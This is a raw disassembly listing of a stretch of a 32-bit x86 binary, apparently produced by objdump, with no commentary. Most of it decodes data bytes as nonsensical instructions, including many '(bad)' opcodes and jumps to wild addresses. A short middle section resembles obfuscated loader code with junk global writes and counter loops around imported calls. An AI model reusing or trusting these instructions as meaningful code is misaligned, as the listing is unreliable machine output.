  40d29c:	push   ebx
  40d29d:	or     edx,DWORD PTR [eax-0x1c]
  40d2a0:	and    edi,DWORD PTR ds:0x120f9f32
  40d2a6:	jmp    0xa2fd6483
  40d2ab:	out    0xc0,eax
  40d2ad:	mov    cs,WORD PTR [edi]
  40d2af:	sub    eax,0x695f2c9
  40d2b4:	push   edx
  40d2b5:	das    
  40d2b6:	test   eax,ecx
  40d2b8:	push   0x56
  40d2ba:	fdivr  QWORD PTR [edi+0x3e]
  40d2bd:	cld    
  40d2be:	(bad)  
  40d2c0:	sbb    ebp,edi
  40d2c2:	(bad)  
  40d2c3:	and    cl,BYTE PTR [edx+0x1]
  40d2c6:	xor    eax,0x774c8f4
  40d2cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2cc:	or     esp,DWORD PTR [esp+eiz*4]
  40d2cf:	sbb    al,0xfa
  40d2d1:	sub    eax,0xeec7b956
  40d2d6:	(bad)  
  40d2d7:	sub    esp,ebx
  40d2d9:	jne    0x40d32e
  40d2db:	retf   0x5df7
  40d2de:	je     0x40d33f
  40d2e0:	xchg   ebp,eax
  40d2e1:	mov    dl,BYTE PTR [ebx+edx*4+0x6c]
  40d2e5:	mov    al,ds:0xe3043fae
  40d2ea:	shr    dl,0x65
  40d2ed:	clc    
  40d2ee:	dec    edi
  40d2ef:	outs   dx,DWORD PTR ds:[esi]
  40d2f0:	sub    eax,0xa1a47606
  40d2f5:	mov    DWORD PTR [ebx-0x193d8546],ecx
  40d2fb:	push   edi
  40d2fc:	xchg   DWORD PTR [edx],eax
  40d2fe:	outs   dx,BYTE PTR ds:[esi]
  40d2ff:	stc    
  40d300:	mov    eax,0xca40bc49
  40d305:	inc    eax
  40d306:	fcom   st(7)
  40d308:	and    al,0x6b
  40d30a:	fisttp QWORD PTR [edx+ebx*1+0x15]
  40d30e:	sar    bh,cl
  40d310:	call   FWORD PTR [ebx-0x5]
  40d313:	adc    bl,al
  40d315:	fmul   DWORD PTR [eax]
  40d317:	and    BYTE PTR [edx+0x11cb6920],bl
  40d31d:	add    ch,BYTE PTR [eax+0x3350ea9b]
  40d323:	fisttp DWORD PTR [ebx+0x5ee94ad4]
  40d329:	add    al,BYTE PTR [eax]
  40d32b:	add    BYTE PTR [ebx-0x4cd54cfa],bl
  40d331:	stos   DWORD PTR es:[edi],eax
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	repnz into 
  40d33a:	inc    ecx
  40d33b:	xor    DWORD PTR [eax+0x387e7e97],esi
  40d341:	jl     0x40d3c1
  40d343:	jle    0x40d391
  40d345:	jbe    0x40d3c6
  40d347:	cmp    eax,0x2504eee
  40d34c:	pop    ebx
  40d34d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d34e:	lea    edx,[ecx]
  40d350:	outs   dx,DWORD PTR ds:[esi]
  40d351:	and    ebp,DWORD PTR [eax]
  40d353:	loopne 0x40d3a5
  40d355:	push   eax
  40d356:	push   0xffffff8a
  40d358:	jp     0x40d2ea
  40d35a:	pop    es
  40d35b:	bound  esi,QWORD PTR [edi-0x54]
  40d35e:	loop   0x40d311
  40d360:	mov    eax,ds:0xc2052c07
  40d365:	push   ebx
  40d366:	add    ch,BYTE PTR [ebp-0x3ba5a20d]
  40d36c:	inc    ebx
  40d36d:	push   es
  40d36e:	stos   BYTE PTR es:[edi],al
  40d36f:	scas   eax,DWORD PTR es:[edi]
  40d370:	imul   edi,DWORD PTR [ebp+0x6ca488c3],0x590ab4cf
  40d37a:	add    eax,0xa6e05665
  40d37f:	pop    ecx
  40d380:	dec    edi
  40d381:	outs   dx,BYTE PTR ds:[esi]
  40d382:	cli    
  40d383:	scas   eax,DWORD PTR es:[edi]
  40d384:	jmp    0x40d3b6
  40d386:	sub    edx,ebp
  40d388:	icebp  
  40d389:	mov    WORD PTR [ebp-0x54207dca],gs
  40d38f:	add    BYTE PTR [ebx+edx*1+0x75081286],bh
  40d396:	int    0x12
  40d398:	xor    DWORD PTR [ebx],esi
  40d39a:	aaa    
  40d39b:	jnp    0x40d3af
  40d39d:	adc    DWORD PTR [esi],0xfffffffd
  40d3a0:	xchg   ebp,eax
  40d3a1:	or     DWORD PTR [edx],0xffffffd3
  40d3a4:	loope  0x40d32b
  40d3a6:	aas    
  40d3a7:	popa   
  40d3a8:	in     eax,dx
  40d3a9:	xlat   BYTE PTR ds:[ebx]
  40d3aa:	imul   edx,DWORD PTR [eax],0xfffffffc
  40d3ad:	pop    ss
  40d3ae:	rcl    DWORD PTR [ebp-0x33],cl
  40d3b1:	adc    edx,DWORD PTR [esi+0x24]
  40d3b4:	outs   dx,DWORD PTR ds:[esi]
  40d3b5:	rol    DWORD PTR ds:0xab4182dd,1
  40d3bb:	fs dec ebp
  40d3bd:	cmp    al,0xaa
  40d3bf:	mov    al,0x2d
  40d3c1:	jmp    0x83c81ced
  40d3c6:	data16 xor al,0xc9
  40d3c9:	push   cs
  40d3ca:	fs inc eax
  40d3cc:	ret    
  40d3cd:	cmp    eax,0xe0e4386e
  40d3d2:	mov    ebx,DWORD PTR [esi]
  40d3d4:	aaa    
  40d3d5:	fs test eax,0x923a380
  40d3db:	les    esp,FWORD PTR [eax+0x21]
  40d3de:	cmc    
  40d3df:	push   eax
  40d3e0:	mov    ebx,0x64627d0e
  40d3e5:	sub    BYTE PTR [edi+0x7b],ch
  40d3e8:	xchg   ecx,eax
  40d3e9:	adc    al,BYTE PTR [edx]
  40d3eb:	in     eax,dx
  40d3ec:	xor    BYTE PTR [eax+0x5a],0x3c
  40d3f0:	lea    ebp,[ecx]
  40d3f2:	jb     0x40d399
  40d3f4:	clc    
  40d3f5:	bswap  esp
  40d3f7:	cld    
  40d3f8:	sub    BYTE PTR [eax-0x39],0x55
  40d3fc:	sbb    ch,BYTE PTR [ecx+0x73690b0b]
  40d402:	or     ebx,esi
  40d404:	mov    edx,0xe168d75f
  40d409:	pop    edx
  40d40a:	push   ecx
  40d40b:	cmp    dl,dl
  40d40d:	xchg   edi,eax
  40d40e:	jnp    0x40d406
  40d410:	ss jbe 0x40d3c4
  40d413:	pop    ecx
  40d414:	mov    esi,0x6d6a7688
  40d419:	adc    DWORD PTR [ebx-0x2819a098],eax
  40d41f:	arpl   WORD PTR ds:0xf9a90671,cx
  40d425:	mov    ebx,edi
  40d427:	or     al,0x27
  40d429:	sbb    eax,0x8443d22b
  40d42e:	and    edx,edi
  40d430:	ds iret 
  40d432:	(bad)  
  40d433:	ds cmp al,0x81
  40d436:	jmp    0x40d402
  40d438:	hlt    
  40d439:	cmc    
  40d43a:	rcl    esi,1
  40d43c:	dec    DWORD PTR [esi]
  40d43e:	jne    0x40d490
  40d440:	jo     0x40d4a4
  40d442:	push   es
  40d443:	jne    0x40d3fb
  40d445:	(bad)  [esp+esi*1+0x23]
  40d449:	stc    
  40d44a:	cmp    DWORD PTR [edx],ecx
  40d44c:	repz adc eax,0xb2f0db98
  40d452:	jns    0x40d3f8
  40d454:	retf   0x8eaf
  40d457:	or     bh,ch
  40d459:	rcl    BYTE PTR [ecx],cl
  40d45b:	xor    DWORD PTR [esi+eax*2+0xc64eb1a],ebx
  40d462:	cdq    
  40d463:	inc    ebp
  40d464:	rcr    BYTE PTR [bp+di-0x2c39],cl
  40d469:	not    bh
  40d46b:	sar    BYTE PTR [edx+0x53b57931],0xed
  40d472:	and    BYTE PTR [esi-0x456c3018],0xfd
  40d479:	inc    ecx
  40d47a:	push   ss
  40d47b:	or     edi,DWORD PTR [edi+ebp*4]
  40d47e:	ret    
  40d47f:	in     eax,dx
  40d480:	call   0x5cb9:0xdbdc0ea2
  40d487:	loopne 0x40d4e3
  40d489:	pushf  
  40d48a:	mov    ds:0x17d15c60,eax
  40d48f:	xchg   esi,eax
  40d490:	scas   al,BYTE PTR es:[edi]
  40d491:	mov    al,ds:0xb1c6d80e
  40d496:	mov    dh,0x7e
  40d498:	mov    ch,0xd2
  40d49a:	je     0x40d481
  40d49c:	pop    ds
  40d49d:	xor    ebp,ebp
  40d49f:	lea    esp,[esi]
  40d4a1:	test   DWORD PTR [edi*2-0x72f013fb],ebx
  40d4a8:	in     al,dx
  40d4a9:	mov    al,ds:0x703e2922
  40d4ae:	bound  edi,QWORD PTR [eax+ebx*2-0x61]
  40d4b2:	loopne 0x40d4fc
  40d4b4:	xchg   esi,eax
  40d4b5:	mov    esp,ecx
  40d4b7:	xchg   ecx,eax
  40d4b8:	(bad)  
  40d4ba:	repz pop ebp
  40d4bc:	sub    eax,0x710f961d
  40d4c1:	ins    BYTE PTR es:[edi],dx
  40d4c2:	imul   edi,DWORD PTR [esi],0xa118e47e
  40d4c8:	mov    ds:0x5999060d,eax
  40d4cd:	ret    0x7edb
  40d4d0:	or     esi,DWORD PTR [esp+edi*2-0x2a]
  40d4d4:	test   BYTE PTR [ebx+esi*1],0xf8
  40d4d8:	sub    eax,0xda314d41
  40d4dd:	clc    
  40d4de:	xor    esp,DWORD PTR [ecx]
  40d4e0:	cld    
  40d4e1:	pop    eax
  40d4e2:	adc    DWORD PTR [edi+0x5f],ebp
  40d4e5:	sbb    bh,BYTE PTR [esi+0x74]
  40d4e8:	and    BYTE PTR [edi+0x229156f],dl
  40d4ee:	lods   eax,DWORD PTR ds:[esi]
  40d4ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4f0:	(bad)  
  40d4f2:	add    edx,0xcbbcb338
  40d4f8:	inc    esi
  40d4f9:	(bad)  
  40d4fa:	div    BYTE PTR [edi]
  40d4fc:	bound  edi,QWORD PTR [esi-0x3421db50]
  40d502:	jno    0x40d535
  40d504:	mov    eax,cs:0x12bac624
  40d50a:	fild   DWORD PTR [edx+0x76c78bd5]
  40d510:	mov    al,0xa6
  40d512:	push   esi
  40d513:	and    eax,0x5640950c
  40d518:	push   0x22
  40d51a:	mov    BYTE PTR cs:[esi+0x9140fd4],ah
  40d521:	test   al,0x1
  40d523:	scas   eax,DWORD PTR es:[edi]
  40d524:	das    
  40d525:	sbb    esi,DWORD PTR [edi-0x556b98ed]
  40d52b:	call   0x354551d
  40d530:	dec    eax
  40d531:	nop
  40d532:	retf   
  40d533:	(bad)  
  40d534:	or     eax,0xc97906a4
  40d539:	loop   0x40d597
  40d53b:	cmp    esp,edx
  40d53d:	rcr    DWORD PTR [edi+0x4cc5518b],0x57
  40d544:	dec    esp
  40d545:	repnz mov cl,0x8d
  40d548:	sub    eax,0x31033e9e
  40d54d:	add    DWORD PTR [edx+0x3629b92c],esp
  40d553:	xor    BYTE PTR [esi],0xc2
  40d556:	stos   BYTE PTR es:[edi],al
  40d557:	int    0xc1
  40d559:	or     bl,BYTE PTR [eax]
  40d55b:	pop    es
  40d55c:	xchg   ebx,eax
  40d55d:	gs aad 0x28
  40d560:	push   edi
  40d561:	arpl   WORD PTR [ebp-0x13],bx
  40d564:	hlt    
  40d565:	xchg   ebx,eax
  40d566:	push   es
  40d567:	jp     0x40d5e2
  40d569:	test   eax,0x6dd108ee
  40d56f:	xchg   ebx,eax
  40d570:	in     al,dx
  40d571:	sub    bh,BYTE PTR [ebx+ebp*4-0x4b]
  40d575:	mul    DWORD PTR [edx+0x3e]
  40d578:	pusha  
  40d579:	sbb    ebx,DWORD PTR [esi]
  40d57b:	mov    ds,WORD PTR [edi+0x111f5095]
  40d581:	mov    edx,0x6946b59e
  40d586:	pop    eax
  40d587:	sub    al,0x16
  40d589:	scas   al,BYTE PTR es:[edi]
  40d58a:	inc    ebx
  40d58b:	add    ebx,DWORD PTR [edx+ebx*1]
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x433723,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433717,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43371b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x433727,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x433763
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43371b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x4337a7,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x4337af,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x4336db,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x43375b,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433797,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433797
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433797,edx
  40d64f:	cmp    DWORD PTR ds:0x433797,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433797,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x4336e3,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x4336e3
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x4336e3,edx
  40d68b:	cmp    DWORD PTR ds:0x4336e3,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x4337d3
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x4336e3,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x4336e7
  40d6b7:	add    eax,DWORD PTR ds:0x43371b
  40d6bd:	mov    ds:0x4336e7,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0xd2a0482a
  40d6f9:	adc    BYTE PTR [edx+0x7e927a37],dh
  40d6ff:	jle    0x40d73f
  40d701:	jl     0x40d781
  40d703:	jle    0x40d6f7
  40d705:	or     ebp,edx
  40d707:	mov    edi,0xf7094851
  40d70c:	push   edx
  40d70d:	pop    ebp
  40d70e:	fstp   QWORD PTR [edx-0xc]
  40d711:	jmp    DWORD PTR [esp+ebx*2+0x2acbf92e]
  40d718:	adc    eax,0xa868a805
  40d71d:	nop
  40d71e:	xchg   edi,eax
  40d71f:	lods   eax,DWORD PTR ds:[esi]
  40d720:	pop    edx
  40d721:	xor    BYTE PTR [ebx-0x58],ah
  40d724:	mov    bl,0x98
  40d726:	add    al,0xa1
  40d728:	and    al,0xed
  40d72a:	es or  eax,0x5b76d2db
  40d730:	jmp    0x4ec6cd26
  40d735:	cli    
  40d736:	xor    DWORD PTR [ecx-0x451133e9],ebx
  40d73c:	mov    cl,0xd2
  40d73e:	pop    ebp
  40d73f:	xchg   esi,eax
  40d740:	icebp  
  40d741:	push   esi
  40d742:	push   ecx
  40d743:	rcl    dh,1
  40d745:	int    0x55
  40d747:	stos   BYTE PTR es:[edi],al
  40d748:	sbb    esi,DWORD PTR [edi]
  40d74a:	push   edi
  40d74b:	es std 
  40d74d:	out    0x38,eax
  40d74f:	mov    WORD PTR [eax-0x79],gs
  40d752:	jp     0x40d749
  40d754:	sbb    al,0x3
  40d756:	or     eax,0x9cc23167
  40d75b:	jae    0x40d705
  40d75d:	cmp    al,0x5c
  40d75f:	jb     0x40d75d
  40d761:	ret    0xd8c2
  40d764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d765:	je     0x40d771
  40d767:	xor    esp,ebp
  40d769:	mov    dl,0x4c
  40d76b:	xor    al,0x6a
  40d76d:	inc    edx
  40d76e:	pop    esp
  40d76f:	xchg   esp,eax
  40d770:	mov    dl,0x66
  40d772:	adc    eax,0xef11bba4
  40d777:	jno    0x40d7b6
  40d779:	jp     0x40d751
  40d77b:	mov    cs,WORD PTR [esi+0x30]
  40d77e:	outs   dx,DWORD PTR ds:[esi]
  40d77f:	dec    edi
  40d780:	out    0xd,eax
  40d782:	adc    bh,BYTE PTR [ebx-0x1ae86ce2]
  40d788:	pop    ds
  40d789:	mov    edi,0x8b42e720
  40d78e:	and    eax,0x2b184e80
  40d793:	sub    DWORD PTR [ecx+eax*1+0x36],esi
  40d797:	scas   al,BYTE PTR es:[edi]
  40d798:	add    eax,0x983c0c4d
  40d79d:	adc    esp,DWORD PTR ds:0x778ae53d
  40d7a3:	mov    bl,0xe1
  40d7a5:	loop   0x40d742
  40d7a7:	dec    eax
  40d7a8:	outs   dx,BYTE PTR ds:[esi]
  40d7a9:	stos   BYTE PTR es:[edi],al
  40d7aa:	mov    ecx,0xd526cac5
  40d7af:	mov    eax,0x4aecd65e
  40d7b4:	aam    0xcf
  40d7b6:	mov    WORD PTR [ecx+0x176650a2],gs
  40d7bc:	jae    0x40d7e9
  40d7be:	sub    eax,0xeb203ac4
  40d7c3:	sub    dh,BYTE PTR [edi]
  40d7c5:	dec    esp
  40d7c6:	mov    edx,0x48ee3b8a
  40d7cb:	fisttp QWORD PTR [edx+0x30]
  40d7ce:	adc    BYTE PTR [eax-0x16],cl
  40d7d1:	add    al,0x16
  40d7d3:	outs   dx,DWORD PTR ds:[esi]
  40d7d4:	jno    0x40d7bd
  40d7d6:	icebp  
  40d7d7:	in     al,dx
  40d7d8:	aaa    
  40d7d9:	lods   al,BYTE PTR ds:[esi]
  40d7da:	repnz push esp
  40d7dc:	or     ecx,eax
  40d7de:	fistp  DWORD PTR [esi+0x46548be0]
  40d7e4:	push   ss
  40d7e5:	ja     0x40d824
  40d7e7:	pop    ss
  40d7e8:	mov    eax,ss
  40d7ea:	push   ds
  40d7eb:	add    BYTE PTR [edx],0xac
  40d7ee:	js     0x40d824
  40d7f0:	jno    0x40d833
  40d7f2:	sub    al,0x8e
  40d7f4:	xchg   edx,eax
  40d7f5:	or     al,0x80
  40d7f7:	push   ebx
  40d7f8:	jo     0x40d791
  40d7fa:	dec    ebx
  40d7fb:	mov    ebx,0xf343a06a
  40d800:	daa    
  40d801:	inc    esp
  40d802:	cmp    eax,0x341efdf8
  40d807:	cdq    
  40d808:	pusha  
  40d809:	stos   DWORD PTR es:[edi],eax
  40d80a:	(bad)  [edi+ebx*8-0x9]
  40d80e:	lahf   
  40d80f:	sbb    DWORD PTR [ebx+esi*8],0x4
  40d813:	xchg   esp,eax
  40d814:	stc    
  40d815:	outs   dx,DWORD PTR ds:[esi]
  40d816:	fs inc edx
  40d818:	sub    DWORD PTR [edx+0x66ca943f],ebp
  40d81e:	xchg   esi,eax
  40d81f:	mov    ebx,0x78f45881
  40d824:	dec    BYTE PTR [ecx+esi*2]
  40d827:	inc    edx
  40d828:	imul   eax,DWORD PTR [ebp+0x12],0x2c
  40d82c:	dec    esi
  40d82d:	shl    DWORD PTR [edx-0x6a421404],1
  40d833:	jmp    DWORD PTR ds:0xfb686b3a
  40d839:	out    dx,al
  40d83a:	sub    DWORD PTR [ebp+0x3b],0x35
  40d83e:	rcr    BYTE PTR [edi+0x75172ccf],cl
  40d844:	inc    eax
  40d845:	int3   
  40d846:	mov    bl,0xad
  40d848:	out    0x4e,eax
  40d84a:	or     eax,edi
  40d84c:	jmp    0xc4dc9168
  40d851:	push   ds
  40d852:	leave  
  40d853:	in     al,0x4f
  40d855:	outs   dx,DWORD PTR ds:[esi]
  40d856:	sub    eax,0xeb161f2b
  40d85b:	cmc    
  40d85c:	ds push ebx
  40d85e:	lea    edi,[edi+0x25]
  40d861:	pop    ebx
  40d862:	pop    esi
  40d863:	(bad)  
  40d864:	mov    ds:0xccd470ef,al
  40d869:	cmp    esi,0x2ea14c16
  40d86f:	add    eax,0xc7517840
  40d874:	enter  0x36f4,0x96
  40d878:	jns    0x40d80b
  40d87a:	push   edi
  40d87b:	xchg   DWORD PTR [ecx],esi
  40d87d:	xor    dl,BYTE PTR [edx-0x7f]
  40d880:	pop    ecx
  40d881:	add    BYTE PTR [ecx+0x454ddf8c],dl
  40d887:	fincstp 
  40d889:	test   BYTE PTR [esi],al
  40d88b:	push   0xd973ccde
  40d890:	xchg   ebp,eax
  40d891:	stc    
  40d892:	in     eax,0x3e
  40d894:	sub    DWORD PTR [ecx],esi
  40d896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d897:	jb     0x40d828
  40d899:	xor    eax,0xd7d13a4b
  40d89e:	jne    0x40d871
  40d8a0:	test   BYTE PTR [eax+eax*4],cl
  40d8a3:	cmc    
  40d8a4:	sbb    eax,0xbfac0ce3
  40d8a9:	repz cld 
  40d8ab:	ret    0x526e
  40d8ae:	mov    dl,0x20
  40d8b0:	push   ds
  40d8b1:	stos   BYTE PTR es:[edi],al
  40d8b2:	js     0x40d8db
  40d8b4:	xchg   edi,eax
  40d8b5:	mov    edi,0xf6474be6
  40d8ba:	xor    al,0x8b
  40d8bc:	and    BYTE PTR [edi+ecx*8-0x7c],dh
  40d8c0:	jle    0x40d8be
  40d8c2:	add    al,0x70
  40d8c4:	aaa    
  40d8c5:	ins    BYTE PTR es:[edi],dx
  40d8c6:	inc    eax
  40d8c7:	aam    0xd8
  40d8c9:	jnp    0xbd0f30fa
  40d8cf:	sub    dl,ch
  40d8d1:	mov    esp,DWORD PTR [esi+eax*2+0x37]
  40d8d5:	mov    dl,0x5e
  40d8d7:	mov    dl,0x25
  40d8d9:	pop    DWORD PTR [edi+0x55f4e53d]
  40d8df:	push   esi
  40d8e0:	call   0xa201:0x8cc97204
  40d8e7:	inc    edi
  40d8e8:	fwait
  40d8e9:	sub    eax,0x66b57d06
  40d8ee:	jb     0x40d969
  40d8f0:	cld    
  40d8f1:	ret    0xa3b2
  40d8f4:	jbe    0x40d913
  40d8f6:	and    bh,dh
  40d8f8:	fcmovnb st,st(6)
  40d8fa:	es xor eax,0xf99189e9
  40d900:	ret    0xe76c
  40d903:	xchg   esp,eax
  40d904:	repz test al,0x37
  40d907:	ins    DWORD PTR es:[edi],dx
  40d908:	cmp    eax,0x796b6b93
  40d90d:	loopne 0x40d94f
  40d90f:	jnp    0x40d966
  40d911:	sbb    al,0x2e
  40d913:	xchg   esp,eax
  40d914:	mov    ebp,0xb5c3ed3
  40d919:	mov    cl,0x72
  40d91b:	lock enter 0x1f37,0xb9
  40d920:	cs inc edi
  40d922:	outs   dx,DWORD PTR ds:[esi]
  40d923:	inc    edi
  40d924:	jo     0x40d953
  40d926:	mov    ebx,DWORD PTR ss:[ebx-0x2c0d1f61]
  40d92d:	outs   dx,DWORD PTR ds:[esi]
  40d92e:	cwde   
  40d92f:	pushf  
  40d930:	stc    
  40d931:	mov    dh,0x18
  40d933:	or     ah,0x6f
  40d936:	bound  eax,QWORD PTR [eax+0x5daa2107]
  40d93c:	lds    ebp,FWORD PTR [ecx+edi*8+0x44f14ea5]
  40d943:	sbb    cl,BYTE PTR [ecx-0x7ba74ff]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xcc2b51ed
  40d96a:	jl     0x40d917
  40d96c:	bound  edi,QWORD PTR [edx]
  40d96e:	nop
  40d96f:	jle    0x40d9ef
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d9a8
  40d976:	iret   
  40d977:	sbb    di,si
  40d97a:	xchg   esp,eax
  40d97b:	inc    ebp
  40d97c:	into   
  40d97d:	inc    ebp
  40d97e:	and    ebp,ecx
  40d980:	mov    ebp,0x1be5eda3
  40d985:	lds    esp,FWORD PTR [edx-0x2b1f19eb]
  40d98b:	sahf   
  40d98c:	jl     0x40d91a
  40d98e:	daa    
  40d98f:	test   al,0x66
  40d991:	ja     0x40d98e
  40d993:	out    0x38,al
  40d995:	push   esp
  40d996:	push   ds
  40d997:	leave  
  40d998:	push   ebp
  40d999:	stos   BYTE PTR es:[edi],al
  40d99a:	mov    DWORD PTR [ecx+ebx*4+0x27f56b04],0x2f327792
  40d9a5:	sub    BYTE PTR [ecx-0x5c265458],0x6f
  40d9ac:	xor    ch,BYTE PTR [ebx+0x32dd69af]
  40d9b2:	add    ah,dl
  40d9b4:	ror    DWORD PTR [eax+0x27],1
  40d9b7:	int    0x6
  40d9b9:	xor    eax,0xcd0ae20d
  40d9be:	jmp    0x40da27
  40d9c0:	xchg   ebp,edx
  40d9c2:	xchg   ecx,eax
  40d9c3:	imul   esi,DWORD PTR [ecx+0x3],0x346d3dd5
  40d9ca:	fsub   QWORD PTR [ebx+0x3f]
  40d9cd:	outs   dx,BYTE PTR ds:[esi]
  40d9ce:	push   esp
  40d9cf:	inc    ecx
  40d9d0:	imul   edi,DWORD PTR [edi],0x24
  40d9d3:	jae    0x40d9e3
  40d9d5:	pop    ds
  40d9d6:	and    al,0x92
  40d9d8:	dec    edx
  40d9d9:	jecxz  0x40d9c4
  40d9db:	jmp    0x40da37
  40d9dd:	and    al,0x5b
  40d9df:	xchg   esi,eax
  40d9e0:	adc    edi,DWORD PTR [esi]
  40d9e2:	mov    ebx,0x320f1f7a
  40d9e7:	mov    dh,0x56
  40d9e9:	or     BYTE PTR [edi+eax*2-0x1391b90e],cl
  40d9f0:	push   esp
  40d9f1:	xlat   BYTE PTR ds:[ebx]
  40d9f2:	push   es
  40d9f3:	clc    
  40d9f4:	mov    ds:0x852618bc,eax
  40d9f9:	mov    ds:0x180a8289,al
  40d9fe:	mul    DWORD PTR ds:0x33403e99
  40da04:	inc    eax
  40da05:	into   
  40da06:	jecxz  0x40da16
  40da08:	xlat   BYTE PTR ds:[ebx]
  40da09:	iret   
  40da0a:	cwde   
  40da0b:	jae    0x40d991
  40da0d:	xor    DWORD PTR [ebx-0x29],edi
  40da10:	mov    BYTE PTR [edx+0x7c0b7d2a],0xef
  40da17:	jecxz  0x40d9d9
  40da19:	adc    ebx,ebp
  40da1b:	sbb    ebp,esi
  40da1d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da1f:	cmc    
  40da20:	inc    ecx
  40da21:	jb     0x40da94
  40da23:	test   al,0xc2
  40da25:	sbb    ebp,DWORD PTR [ebx+0x5f]
  40da28:	js     0x40da34
  40da2a:	push   es
  40da2b:	repz pop esp
  40da2d:	push   ds
  40da2e:	or     BYTE PTR [edx-0x30],bh
  40da31:	xor    BYTE PTR [ecx+ecx*1+0x29],bh
  40da35:	or     eax,DWORD PTR [eax+edi*1-0x57]
  40da39:	jno    0x40da7a
  40da3b:	retf   0x2ad3
  40da3e:	popa   
  40da3f:	push   ebp
  40da40:	inc    ebp
  40da41:	push   0xf933f8f
  40da46:	and    cl,bh
  40da48:	mov    WORD PTR [ebx+0x5e],fs
  40da4b:	call   0x9c7e117b
  40da50:	adc    ecx,DWORD PTR [eax+0x2a435b52]
  40da56:	(bad)  [ecx-0x48]
  40da59:	outs   dx,DWORD PTR ds:[esi]
  40da5a:	test   BYTE PTR [edi-0x795bb674],dh
  40da60:	cmp    BYTE PTR [esi-0x4],0xca
  40da64:	mov    al,0x18
  40da66:	push   es
  40da67:	retf   
  40da68:	test   DWORD PTR [edi-0x2d],esi
  40da6b:	sbb    DWORD PTR [ecx],edx
  40da6d:	cmp    DWORD PTR [esi],0x41347b7f
  40da73:	inc    ebp
  40da74:	ret    
  40da75:	xchg   ebx,eax
  40da76:	lods   eax,DWORD PTR ds:[esi]
  40da77:	cmc    
  40da78:	mov    edx,0x62dab16d
  40da7d:	pop    ebp
  40da7e:	mov    WORD PTR [eax+0x49de78aa],ss
  40da84:	sbb    eax,ecx
  40da86:	mov    dl,0xea
  40da88:	cdq    
  40da89:	stos   DWORD PTR es:[edi],eax
  40da8a:	dec    ecx
  40da8b:	push   ebp
  40da8c:	je     0x40da4c
  40da8e:	push   ds
  40da8f:	push   edx
  40da90:	dec    ecx
  40da91:	xor    ah,0x50
  40da94:	imul   esp,DWORD PTR [esi+eax*4],0xffffffc2
  40da98:	cli    
  40da99:	jmp    0x8fb60cea
  40da9e:	adc    ch,BYTE PTR [ebx]
  40daa0:	icebp  
  40daa1:	stc    
  40daa2:	mov    edi,0x8a469448
  40daa7:	(bad)  
  40daa8:	mov    ah,0xcc
  40daaa:	cld    
  40daab:	sbb    eax,0xa0712f32
  40dab0:	add    al,0xa3
  40dab2:	iret   
  40dab3:	and    eax,0x3dd68eac
